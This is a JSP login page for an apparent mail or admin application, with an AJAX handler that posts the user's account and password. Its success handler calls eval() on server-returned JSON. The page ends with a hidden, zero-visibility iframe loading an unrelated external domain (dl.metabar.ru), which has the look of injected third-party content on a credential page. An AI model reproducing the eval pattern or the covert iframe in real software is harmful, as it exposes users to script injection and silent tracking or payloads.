<%@ page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<html xmlns="http://www.w3.org/1999/xhtml" g_init="6858"><head>
<title>HemailLogin</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
<link rel="shortcut icon" href="./front/admincg/images/favicon.ico" type="image/x-icon"> 
<link rel="stylesheet" type="text/css" id="css" href="./front/admincg/images/login_13/User_Login.css">
<link rel="stylesheet" type="text/css" id="css" href="./front/admincg/images/logmsg.css">
<script language="javascript" src="./front/admincg/javascript/jquery.min.js?ver=1"></script>
<script language="javascript" src="./front/admincg/javascript/base64.min.js?ver=2"></script>
<script language="javascript" src="./front/admincg/javascript/jquery.md5.js?ver=3"></script>
<script language="javascript" src="./front/admincg/javascript/jquery.jcryption.3.1.0.js?ver=1"></script>
<script language="javascript" src="./front/admincg/javascript/loginfrm.js?ver=1"></script>
<script type="text/javascript">
function login(){
	$.ajax({
		type : "post",
		url : "<%=path%>/jsonf/loginIn.action",
		data: {"userAccount":$("input[name='userAccount']").val(),
				 "userPassword":$("input[name='userPassword']").val()},
		dataType : "json",
		success : function(data) {
			var obj = eval("("+data.returnJson+")");
			if (obj.status==0) {
				window.location.href="<%=path%>/front/goToIndex.action";
			}else{
				alert(obj.msg)
			}
         }
 	});
};
function finalcheck(){
	if($("input[name='userAccount']").val()==""){
		alert("Please fill out the account！");
		$("input[name='userAccount']").focus();
		return false;
	}else if($("input[name='userPassword']").val()==""){
		alert("Please fill in password！");
		$("input[name='userPassword']").focus();
		return false;
	}
	login();
};
function send(event){
	if(event.keyCode==13) {
		return finalcheck();
	}
};
</script></head>

<body topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" marginwidth="0" marginheight="0">

<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tbody><tr><td>
	
		<form method="post" id="loginfrm" name="loginfrm"><input type="hidden" id="sid" name="sid" value="N2nVYf"><input type="hidden" name="loginaction" value="1">
			<input type="hidden" name="Hrand" value="606507960"><br><table align="center" width="840" border="0" cellpadding="0" cellspacing="0">
	<tbody><tr>
		<td colspan="3" height="62" background="./front/admincg/images/login_13/1_01.gif">
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tbody><tr>
		<td width="220"></td>
		<td width="40">AT:&nbsp;&nbsp;</td>
		<td width="120"><input type="text" id="userName" name="userAccount" onkeypress="send(event)" value="" style="width:100px; height:20px; background:#e9e6e6; font-size:12px; border:solid 1px #a0a0a0; color:#3b1b1b;" /></td>
		<td width="40">PW:&nbsp;&nbsp;</td>
		<td width="120"><input type="password" id="userPassword" onkeypress="send(event)" name="userPassword" style="width:100px; height:20px; background:#e9e6e6; font-size:12px; border:solid 1px #a0a0a0; color:#3b1b1b;" /></td>
        <td height="30" width="*">&nbsp;&nbsp;
        <input type="button" id="login_admin" name="login_admin" onclick="return finalcheck();" value=" login" class="login_a_input" />
       </td>
	</tr>
</tbody></table>
			</td>
	</tr>
	<tr>
		<td background="./front/admincg/images/login_13/1_02.gif" width="280" height="228"></td>
		<td background="./front/admincg/images/login_13/1_03.gif" width="280"></td>
		<td background="./front/admincg/images/login_13/1_04.gif" width="280"></td>
	</tr>
	<tr>
		<td background="./front/admincg/images/login_13/1_05.gif" height="145"></td>
		<td background="./front/admincg/images/login_13/1_06.gif"></td>
		<td background="./front/admincg/images/login_13/1_07.gif"></td>
	</tr>
	<tr>
		<td background="./front/admincg/images/login_13/1_08.gif" height="145"></td>
		<td background="./front/admincg/images/login_13/1_09.gif"></td>
		<td background="./front/admincg/images/login_13/1_10.gif"></td>
	</tr>
</tbody></table>
</form><script type="text/javascript">setTimeout("$(\"input[name='userAccount']\").focus();",200);</script></td></tr></tbody></table>



<script type="text/javascript" charset="utf-8" id="0DF98C125855B791_Analytics" src="http://tajs.qq.com/stats?sId=26506734"></script><iframe src="https://dl.metabar.ru/static/storage/index.html?version=201508141843" style="display: none;"></iframe></body></html>